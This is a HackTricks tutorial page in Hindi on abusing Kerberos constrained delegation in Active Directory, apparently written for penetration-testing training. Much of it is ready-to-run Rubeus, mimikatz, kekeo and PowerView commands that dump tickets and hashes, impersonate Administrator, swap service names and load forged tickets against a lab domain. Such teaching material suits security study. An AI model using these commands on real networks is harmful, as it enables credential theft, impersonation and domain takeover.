# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

इसका उपयोग करते हुए, एक Domain admin एक कंप्यूटर को **अनुमति** दे सकता है कि वह एक **उपयोगकर्ता या कंप्यूटर** के रूप में **सेवा** के खिलाफ कार्य करे।

- **Service for User to self (**_**S4U2self**_**):** यदि एक **सेवा खाता** का _userAccountControl_ मान [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) को शामिल करता है, तो यह किसी अन्य उपयोगकर्ता की ओर से अपने लिए (सेवा) एक TGS प्राप्त कर सकता है।
- **Service for User to Proxy(**_**S4U2proxy**_**):** एक **सेवा खाता** किसी उपयोगकर्ता की ओर से **msDS-AllowedToDelegateTo** में सेट की गई सेवा के लिए एक TGS प्राप्त कर सकता है। ऐसा करने के लिए, इसे पहले उस उपयोगकर्ता से अपने लिए एक TGS की आवश्यकता होती है, लेकिन यह उस TGS को प्राप्त करने के लिए S4U2self का उपयोग कर सकता है, इससे पहले कि वह दूसरे का अनुरोध करे।

**नोट**: यदि एक उपयोगकर्ता को AD में ‘_Account is sensitive and cannot be delegated_’ के रूप में चिह्नित किया गया है, तो आप उन्हें **अनुकरण** नहीं कर पाएंगे।

इसका मतलब है कि यदि आप **सेवा के हैश को समझौता** करते हैं, तो आप **उपयोगकर्ताओं का अनुकरण** कर सकते हैं और उनके पक्ष में **सेवा पर पहुँच** प्राप्त कर सकते हैं (संभव **privesc**)।

इसके अलावा, आपके पास **उस सेवा तक पहुँच** नहीं होगी जिसे उपयोगकर्ता अनुकरण करने में सक्षम है, बल्कि किसी भी सेवा तक पहुँच होगी क्योंकि SPN (अनुरोधित सेवा नाम) की जांच नहीं की जा रही है, केवल विशेषाधिकार। इसलिए, यदि आपके पास **CIFS सेवा** तक पहुँच है, तो आप Rubeus में `/altservice` ध्वज का उपयोग करके **HOST सेवा** तक भी पहुँच प्राप्त कर सकते हैं।

इसके अलावा, **DC पर LDAP सेवा पहुँच**, एक **DCSync** का शोषण करने के लिए आवश्यक है।
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> कंप्यूटर में SYSTEM न होने के बावजूद **TGT टिकट** या **RC4** या **AES256** प्राप्त करने के **अन्य तरीके** हैं जैसे कि प्रिंटर बग और अनकंस्ट्रेन डेलीगेशन, NTLM रिलेइंग और एक्टिव डायरेक्टरी सर्टिफिकेट सर्विस का दुरुपयोग
>
> **बस उस TGT टिकट (या हैश) के साथ आप बिना पूरे कंप्यूटर को समझौता किए इस हमले को अंजाम दे सकते हैं।**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**अधिक जानकारी ired.team पर।**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
